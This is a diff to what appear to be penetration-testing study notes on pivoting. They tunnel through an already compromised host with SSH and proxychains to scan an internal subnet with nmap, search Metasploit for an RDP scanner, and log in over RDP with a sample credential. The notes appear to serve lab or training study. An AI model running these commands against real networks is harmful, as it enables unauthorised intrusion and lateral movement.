@@ -112,11 +112,11 @@ ssh -D 9050 alreadyCompromisedMachine@10.129.202.64
    socks4 	127.0.0.1 9050
    ```
    ```
-    proxychains nmap -v -sn 172.16.5.1-200
-    proxychains nmap -v -Pn -sT 172.16.5.19
-    proxychains msfconsole
-    search rdp_scanner
-    proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass@123
+    attacker/machine$ proxychains nmap -v -sn 172.16.5.1-200
+    attacker/machine$ proxychains nmap -v -Pn -sT 172.16.5.19
+    attacker/machine$ proxychains msfconsole
+    msf6 >search rdp_scanner
+    attacker/machine$ proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass@123
    ```
  ##### 
  * When SSH is not available use SOCAT
